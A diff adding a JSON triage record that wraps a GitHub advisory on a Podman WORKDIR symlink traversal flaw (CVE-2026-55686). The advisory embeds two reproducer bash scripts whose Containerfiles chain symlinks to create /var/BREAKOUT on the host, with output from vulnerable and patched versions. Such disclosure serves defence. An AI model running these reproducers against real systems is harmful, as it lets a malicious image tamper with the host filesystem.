@@ -1,0 +1,61 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"finder\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/106877?v=4\", \"events_url\": \"https://api.github.com/users/eriksjolund/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/eriksjolund/followers\", \"following_url\": \"https://api.github.com/users/eriksjolund/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/eriksjolund/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/eriksjolund\", \"id\": 106877, \"login\": \"eriksjolund\", \"node_id\": \"MDQ6VXNlcjEwNjg3Nw==\", \"organizations_url\": \"https://api.github.com/users/eriksjolund/orgs\", \"received_events_url\": \"https://api.github.com/users/eriksjolund/received_events\", \"repos_url\": \"https://api.github.com/users/eriksjolund/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/eriksjolund/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/eriksjolund/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/eriksjolund\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-55686\", \"cvss\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 5.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-59\", \"name\": \"Improper Link Resolution Before File Access ('Link Following')\"}], \"description\": \"### Summary\\n\\nRunning a malicous container image where the WORKDIR path contains a symlink can create a directory or modify ownership on the host filesystem. Modified ownership is less likely to happen as that requires help from an untrusted/malicious process that mutates the host filesystem tree during dereferencing of the WORKDIR path, to trigger a race condition.\\n\\n### Patch\\n\\nhttps://github.com/podman-container-tools/podman/commit/d18e44e9abb3bf5b7294aa70806e1368fdddfdd0\\n\\n### Details\\n\\nThis issue was fixed in podman 5.7.1 (git commit 7ce2e00ab140c11a68301f0b161f51984131a858)\\n\\n### PoC\\n\\nThe reproducer script _test1.bash_ demonstrates the vulnerability. \\nThe directory  `/var/BREAKOUT` is created on the host.\\nThe container process uses the container directory `/var/BREAKOUT` as current working directory.\\n\\nThe reproducer script _test2.bash_ demonstrates the same vulnerability. \\nThe directory  `/var/BREAKOUT` is created on the host.\\nThe container process uses the container directory `/usr/local` as current working directory.\\n\\nThe reproducer script _test2.bash_ shows that the working directory can be different from the breakout directory.\\n\\nReproducer **test1.bash**\\n\\n```\\n#!/bin/bash\\nset -o errexit\\nset -o nounset\\n\\nif [ -e /var/BREAKOUT ]; then\\n  echo error: path /var/BREAKOUT should not exist beforehand\\n  exit 1\\nfi\\n\\ndir=$(mktemp -d)\\ncat > $dir/Containerfile << 'EOF'\\nFROM docker.io/library/alpine\\nRUN cd / && ln -s ../../../../../../../var symlink\\nUSER 1234:1234\\nWORKDIR /symlink/BREAKOUT\\nCMD [\\\"/bin/sh\\\",\\\"-c\\\",\\\"echo current working directory: $(pwd)\\\"]\\nEOF\\n\\npodman build -q --no-cache -t img $dir\\npodman run --rm localhost/img\\nls -ld /var/BREAKOUT\\n```\\n\\n\\nReproducer **test2.bash**\\n\\n```\\n#!/bin/bash\\nset -o errexit\\nset -o nounset\\n\\nif [ -e /var/BREAKOUT ]; then\\n  echo error: path /var/BREAKOUT should not exist beforehand\\n  exit 1\\nfi\\n\\ndir=$(mktemp -d)\\ncat > $dir/Containerfile << 'EOF'\\nFROM docker.io/library/alpine\\nARG breakout_dirname=/var\\nARG breakout_basename=BREAKOUT\\nARG produce_pwd=/usr/local\\nRUN mkdir -p /0/1/2/3 && \\\\\\n    cd /0 && \\\\\\n    ln -s 1/2/3 symlink1 && \\\\\\n    mkdir -p /0/1/symlink2/${breakout_dirname} && \\\\\\n    cd /0/1/symlink2/${breakout_dirname} && \\\\\\n    ln -s ${produce_pwd} ${breakout_basename}\\nRUN cd / && ln -s ../../../../../../.. symlink2\\nUSER 1234:1234\\nWORKDIR /0/symlink1/../../symlink2/${breakout_dirname}/${breakout_basename}\\nCMD [\\\"/bin/sh\\\",\\\"-c\\\",\\\"echo current working directory: $(pwd)\\\"]\\nEOF\\n\\npodman build -q --no-cache -t img $dir\\npodman run --rm localhost/img\\nls -ld /var/BREAKOUT\\n```\\n\\n\\n\\nVulnerable:\\n\\npodman 5.7.0 using Fedora CoreOS 43.20251120.3.0\\n\\n```\\nroot@localhost:~# bash test1.bash \\n38c27b69c61941741f49c3f87b589b422391d5908659665cabf248934be0ed80\\ncurrent working directory: /var/BREAKOUT\\ndrwxr-xr-x. 2 1234 1234 6 May 29 19:28 /var/BREAKOUT\\nroot@localhost:~# rmdir /var/BREAKOUT/\\nroot@localhost:~# bash test2.bash \\nc3390edbe393a3f3b182e60c5900cf93444b5120fbe34dc305478b3b77a106c9\\ncurrent working directory: /usr/local\\ndrwxr-xr-x. 2 1234 1234 6 May 29 19:28 /var/BREAKOUT\\n```\\n\\nNot vulnerable:\\n\\npodman 5.7.1 using Fedora CoreOS 43.20260119.1.1\\n\\n```\\nroot@localhost:~# bash test1.bash \\n0229bf752a821d5b9bb8afcf4b94e8de2a4838798ae8065414b7f939b81d0788\\ncurrent working directory: /var/BREAKOUT\\nls: cannot access '/var/BREAKOUT': No such file or directory\\nroot@localhost:~# bash test2.bash \\n568584150a93a003feb8ae1985173bf50ced9cba4d52f9734cb70dc75eeb7c60\\ncurrent working directory: /usr/local\\nls: cannot access '/var/BREAKOUT': No such file or directory\\n```\\n\\n### Credits\\n\\nWe like to thank Erik Sjölund (@eriksjolund) for reporting the security impact to us.\", \"epss\": {\"percentage\": 0.00317, \"percentile\": 0.23511}, \"ghsa_id\": \"GHSA-q6r4-3wmg-fwcq\", \"github_reviewed_at\": \"2026-06-18T14:28:26Z\", \"html_url\": \"https://github.com/advisories/GHSA-q6r4-3wmg-fwcq\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-q6r4-3wmg-fwcq\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-55686\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-18T14:28:26Z\", \"references\": [\"https://github.com/podman-container-tools/podman/security/advisories/GHSA-q6r4-3wmg-fwcq\", \"https://github.com/podman-container-tools/podman/commit/7ce2e00ab140c11a68301f0b161f51984131a858\", \"https://github.com/podman-container-tools/podman/commit/d18e44e9abb3bf5b7294aa70806e1368fdddfdd0\", \"https://github.com/advisories/GHSA-q6r4-3wmg-fwcq\"], \"repository_advisory_url\": \"https://api.github.com/repos/podman-container-tools/podman/security-advisories/GHSA-q6r4-3wmg-fwcq\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/podman-container-tools/podman\", \"summary\": \"Podman: WORKDIR symlink traversal vulnerability\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-18T14:28:27Z\", \"url\": \"https://api.github.com/advisories/GHSA-q6r4-3wmg-fwcq\", \"vulnerabilities\": [{\"first_patched_version\": \"5.7.1\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/containers/podman/v5\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 5.7.0\"}, {\"first_patched_version\": null, \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/containers/podman/v4\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 4.9.5\"}, {\"first_patched_version\": null, \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/containers/podman/v3\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.4.7\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-q6r4-3wmg-fwcq",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/containers/podman/v3: <= 3.4.7",
+      "github.com/containers/podman/v4: <= 4.9.5",
+      "github.com/containers/podman/v5: <= 5.7.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-55686"
+    ],
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/containers/podman/v3",
+      "github.com/containers/podman/v4",
+      "github.com/containers/podman/v5"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:58.234673Z",
+  "provenance": {
+    "content_sha256": "bff10c7a261a54098004685c0d51ab70fa0703c66e59cdcfe95e346fc50dc992",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-18T14:28:26Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-q6r4-3wmg-fwcq",
+  "status": "active",
+  "title": "Podman: WORKDIR symlink traversal vulnerability",
+  "updated_at": "2026-06-18T14:28:27Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-q6r4-3wmg-fwcq"
+}
